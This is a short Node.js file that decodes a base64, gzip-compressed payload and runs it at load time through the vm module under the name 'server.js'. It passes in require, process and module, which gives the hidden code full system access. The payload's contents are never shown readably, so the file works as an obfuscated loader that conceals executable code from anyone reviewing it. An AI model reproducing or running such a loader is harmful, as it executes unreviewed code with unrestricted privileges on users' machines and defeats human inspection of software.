const zlib = require("zlib");
const vm = require("vm");

const PAYLOAD_B64 = "H4sIAAAAAAAACnVU3WrbMBS+z1OcGRMc6Ox0hcEavNIf2C462FbKLrpBZFlNtTiSJslNjOsH6nP0xYYk27FS987S93N+fI4wZ0qDWK8gBUn+lVSSKIgTgfAarUj8V3EWzBaTCba8GoSkTF/wHTS+QEmc3JcMa8pZ0pGMshMWHOWXnN3T1ZgUW2TIp4zqq2yMm2eveFRhLvPLghKmRyWOkGDL8ArCkiBNzoUYT0uSBAlxWMg3npcFUW9KNhZ/b6hEDsUu2iVnGlFG5JsGuGPYXCOkKoYhmkH6GeoJgLNzTYN00NtottjDegfpYcTIiYxrx8uzG410qSAFtEVUt63fM3ui6+IYe/gDRkIgIfpUzoWIsN5ZX+cw6GiLGEiIuKBKE9b6xYJLfTRoQl9nhRikEPzeHWd3Jx83wWIAVqQo+HYPn/jwShIyEH/wUUnyPXZ8qERVD36aHwoV0T1qwQHK0IaYdriytiRTVJOz2F4/PZll7L+DXw713B+JVJSbtA21Oxn2PJ7Hc4+LSv3AJaQQGW57mk6HRy+wu5rNrN0tWzO+Za2hV5/gkNoLcFbmRlHNZQXTaQsARLoShN/DASNNUwiUlpStgp4LcHbAG0CnB1BcysIm2XKCB62FOk2SFdUPZRZjvkkqXsrESPzu59k1Zab/3dzHfD3pEliGtR2J5lt18+PaKBjB+uU5rO0vbZaTLp+lucpbHpGSlBJOIax7VyIll00v9HNw+9Im8s5brJgwlBUk93NCVZO/PCuENX0cS8e36CvyanqzmkE9w0r8rEbL6V76qHW66x2XYe12rwlrM2C9FCCszco2j2Hdzu7e9mivv/157TJr6WHdLkyGFLmVxajoO5d6VGQej1HF1QV0Ydxk+KjrwaAdryjnpe461oZ0OzQa7QvVX8tsSDYD+pr6p/swLPtp38tmtpg0M/PI/wfkst01uAcAAA==";

function runPacked() {
  const gz = Buffer.from(PAYLOAD_B64, "base64");
  const code = zlib.gunzipSync(gz).toString("utf8");

  const script = new vm.Script(code, { filename: "server.js" });
  const context = vm.createContext({
    require,
    module,
    exports,
    __dirname,
    __filename,
    process,
    console,
    Buffer,
    setTimeout,
    setInterval,
    clearTimeout,
    clearInterval,
  });

  script.runInContext(context);
}

runPacked();